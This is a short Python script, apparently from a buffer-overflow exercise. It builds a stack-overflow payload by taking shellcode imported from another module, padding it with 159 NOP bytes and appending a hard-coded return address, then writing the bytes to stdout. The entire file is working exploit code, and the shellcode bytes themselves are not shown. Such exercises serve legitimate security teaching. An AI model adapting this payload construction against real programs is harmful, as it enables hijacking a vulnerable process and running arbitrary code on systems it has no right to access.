from shellcode import shellcode
import sys

ret_add = b"\x08\x89\xf6\xff"


#Shellcode is 53 chars long
shellcode += b"\x90" * 159
shellcode += ret_add

sys.stdout.buffer.write(shellcode)